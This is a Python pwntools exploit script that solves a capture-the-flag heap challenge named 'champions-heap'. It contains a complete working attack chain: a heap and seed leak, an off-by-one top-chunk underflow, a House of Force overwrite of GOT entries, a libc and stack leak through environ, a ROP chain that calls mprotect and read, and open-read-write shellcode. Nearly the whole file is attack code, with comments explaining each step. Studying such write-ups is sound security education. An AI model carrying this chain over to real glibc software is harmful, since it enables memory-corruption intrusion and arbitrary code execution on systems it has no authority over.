#!/usr/bin/env python3

from pwn import *
from ctypes import CDLL, c_long

exe = ELF("./champions-heap")
libc = ELF("./libc.so.6")
ld = ELF("./ld-linux-x86-64.so.2")

if not args.REMOTE:
    libc = exe.libc

HOST, PORT, SSL = "champions-heap.bsides.shellmates.club", 443, True

context.binary = exe
context.terminal = ["tmux", "splitw", "-h", "-p", "75"]

# Constants

GDBSCRIPT = '''\
'''
CHECKING = True

# Lambdas

b = lambda s: s.encode()

def main():
    global io

    libc_funcs = CDLL("./libc.so.6")

    io = conn()

    # Step 1: Collect free heap leak

    io.recvuntil(b"Gift: ")
    buf = io.recvuntil(b"\nEnter", drop=True)
    heap_leak = int(buf, 16)
    # offset to top_chunk
    top_chunk_off = 0x50
    top_chunk_addr = heap_leak + top_chunk_off
    log.info(f"top_chunk @ {top_chunk_addr:#x}")

    # Step 2: Leak the random seed (it's located right after global variable `name`)

    io.recvuntil(b": ")
    p = b"A" * 0x20
    io.send(p)
    io.recvuntil(p)
    buf = io.recvuntil(b", welcome", drop=True)[:4]
    log.info(f"seed buf: {buf}")
    if len(buf) < 3:
        log.error("Null byte in seed")
    seed = u32(buf.ljust(4, b"\x00"))
    log.info(f"seed: {seed}")
    # Call `srand` to generate the same random numbers
    libc_funcs.srand(seed)

    # Step 3: Trigger bug to set top_chunk to 0xfff...

    # Selecting "Real Madrid" (No. 1) guarantees winning everytime
    select(1)

    # Sets top_chunk size to 0x0 because of a wrong condition in for loop (i <= 9 instead of i < 9)
    reset()

    # randint() function includes the upper limit, and since the number
    # of teams is 9, we can achieve an overflow if number 9 is generated
    # (Reminder: indexes start at 0, so max team index should be 8 not 9)
    skip = 0
    while randint(libc_funcs, 0, 9) != 9:
        randint(libc_funcs, 0, 4)
        skip += 1

    # Simulate enough games so that next simulation generates team of index 9
    for _ in range(skip):
        simulate()

    # Now since our selected team "Real Madrid" always wins,
    # the goal difference will be negative for the team of index 9,
    # which is actually not a team but rather the top_chunk.
    # That means that the goal difference from the match will be subtracted from top_chunk size,
    # and since top_chunk size is 0, it will underflow to a large value (0xffff...)
    simulate()

    # Step 4: House of force

    # Using house of force heap attack, we try to reach the GOT table
    # and overwrite `malloc` entry with gets@libc.
    # The GOT table looks likes this:
    # - seccomp_init
    # - putchar
    # - seccomp_rule_add
    # - puts
    # - seccomp_load
    # - __stack_chk_fail
    # - setbuf
    # - printf
    # - close
    # - read
    # - srand
    # - getchar
    # - malloc
    # - atol
    # - open
    # - perror
    # - exit
    # - fwrite
    # - rand

    # We target `getchar` which is right before `malloc`,
    # so that `srand` is overwritten with the remaining top_chunk size,
    # and not `getchar`.
    size = delta(exe.got.getchar, top_chunk_addr)

    # House of force
    add(size, b"A") # teams[4]

    # empty unsorted bin while getting libc main_arena leak
    add(0x88, b"C" * 8) # teams[5]
    teams = show()
    main_arena_leak = teams[5]["name"][8:]
    libc.address = leak(main_arena_leak, libc.sym.main_arena + 224, "libc", verbose=True)

    # GOT table starting from getchar (and global vars)
    # 0e:0070│  0x602070 (getchar@got[plt]) —▸ 0x7f1de4a87ea0 (getchar) ◂— push rbx
    # 0f:0078│  0x602078 (malloc@got[plt]) —▸ 0x7f1de4a97020 (malloc) ◂— push rbp
    # 10:0080│  0x602080 (atol@got[plt]) —▸ 0x7f1de4a40690 (atol) ◂— mov edx, 0xa
    # 11:0088│  0x602088 (open@got[plt]) —▸ 0x7f1de4b0fbf0 (open64) ◂— sub rsp, 0x68
    # 12:0090│  0x602090 (perror@got[plt]) —▸ 0x400a96 (perror@plt+6) ◂— push 0xf
    # 13:0098│  0x602098 (exit@got[plt]) —▸ 0x400aa6 (exit@plt+6) ◂— push 0x10
    # 14:00a0│  0x6020a0 (fwrite@got[plt]) —▸ 0x400ab6 (fwrite@plt+6) ◂— push 0x11
    # 15:00a8│  0x6020a8 (rand@got[plt]) —▸ 0x7f1de4a44390 (rand) ◂— sub rsp, 8
    # 16:00b0│  0x6020b0 ◂— 0x0
    # ... ↓     3 skipped
    # 1a:00d0│  0x6020d0 (num_teams) ◂— 0x8
    # 1b:00d8│  0x6020d8 ◂— 0x0
    # 1c:00e0│  0x6020e0 (teams) —▸ 0x401538 ◂— push rdx /* 'Real Madrid' */
    # 1d:00e8│  0x6020e8 (teams+8) —▸ 0x401544 ◂— 'Manchester City'

    # Super payload:
    # 1. Set GOT entry of malloc to gets
    # 2. Set num_teams back to 0
    # 3. Set second team name pointer to environ@libc to leak stack
    payload = flat(
        libc.sym.getchar,
        libc.sym.gets, # hijack malloc
        libc.sym.atol,
        libc.sym.open,
        exe.plt.perror,
        exe.plt.exit,
        exe.plt.fwrite,
        libc.sym.rand,
        b"\0" * 8 * 4,
        0x0, # set num_teams to 0
        0x0,
        0x0, # this is actually teams[0], but it will just be overwritten anyway using the allocation after this one
        libc.sym.environ, # overwrite teams[1] with environ@libc
    )
    # size 0x110 should be safe enough so we don't overwrite any important data in .bss
    add(0x108, payload) # teams[6]

    # Stack leak
    teams = show()
    environ_leak = teams[1]["name"]
    retaddr_offset = 240
    stack_retaddr = leak(environ_leak, retaddr_offset, "stack return", verbose=True)

    # ROP on stack

    roplibc = ROP(libc)
    pop_rdi = roplibc.rdi.address
    pop_rsi = roplibc.rsi.address
    pop_rdx = roplibc.rdx.address
    ret = roplibc.ret.address

    # shellcode address
    sc_addr = exe.sym.name
    mem_aligned = lambda addr: (addr >> 4*3) << 4*3
    payload = flat(
        # mprotect(mem_aligned(sc_addr), 0x1000, 7)
        pop_rdi,
        mem_aligned(sc_addr),
        pop_rsi,
        0x1000,
        pop_rdx,
        7,
        libc.sym.mprotect,
        # read(0, sc_addr, 0x100)
        pop_rdi,
        0x0,
        pop_rsi,
        sc_addr,
        pop_rdx,
        0x100,
        libc.sym.read,
        # jump to shellcode
        sc_addr,
    )
    # malloc = gets, so size is target address
    size = stack_retaddr
    add(size, payload, gets=True)

    # Exit from main to trigger ROP
    io.sendafter(b"Choice: ", b"0") # Exit

    # Open-Read-Write shellcode to print the flag
    rw_addr = sc_addr + 0x100
    shellcode = asm(
        shellcraft.open("/challenge/flag.txt", 0) +
        shellcraft.read("rax", rw_addr, 0x100) +
        shellcraft.write(1, rw_addr, 0x100) +
        shellcraft.exit(0)
    )
    io.send(shellcode)

    io.interactive()

def delta(addr, top_chunk):
    return c_long(addr - top_chunk - 8).value

def randint(libc_funcs, min_val, max_val):
    return libc_funcs.rand() % (max_val - min_val + 1) + min_val

def add(size, name, gets=False):
    io.sendafter(b"Choice: ", b"1".rjust(0x1f, b" "))
    io.sendafter(b": ", b(f"{size}").rjust(0x1f, b" "))
    # just send a newline because `gets` returns the buffer anyway
    # and we can write our name via read_str call
    if gets:
        io.sendline()
    io.sendafter(b": ", name)

def show():
    io.sendafter(b"Choice: ", b"2".rjust(0x1f, b" "))
    io.recvuntil(b"GD |\n")
    data = io.recvuntil(b"\n\n\n1) Add team", drop=True)
    rows = []
    for row in data.split(b"\n"):
        x = row.split(b"|")
        rows.append({
            "no": int(x[1].strip()),
            "name": x[2].strip(),
            "gd": int(x[3].strip()),
        })
    return rows

def select(num):
    io.sendafter(b"Choice: ", b"3".rjust(0x1f, b" "))
    io.sendafter(b": " , b(f"{num}").rjust(0x1f, b" "))

def simulate():
    io.sendafter(b"Choice: ", b"4".rjust(0x1f, b" "))
    # Choose opponent randomly
    io.sendline(b"y")

def reset():
    io.sendafter(b"Choice: ", b"5".rjust(0x1f, b" "))

def leak(buf, offset, leaktype, verbose=False):
    verbose and log.info(f"buf: {buf}")
    leak_addr = unpack(buf.ljust(context.bytes, b"\x00"))
    base_addr = leak_addr - offset
    verbose and log.info(f"{leaktype} leak: {leak_addr:#x}")
    log.success(f"{leaktype} base address: {base_addr:#x}")
    return base_addr

def stop():
    io.interactive()
    io.close()
    exit(1)

def check(predicate, disabled=False):
    if not disabled and CHECKING:
        assert(predicate)

def conn():
    if args.REMOTE:
        p = remote(HOST, PORT, ssl=SSL)
    elif args.GDB:
        p = gdb.debug(exe.path, gdbscript=GDBSCRIPT)
    else:
        p = process(exe.path)

    return p

if __name__ == "__main__":
    io = None
    try:
        main()
    finally:
        if io:
            io.close()
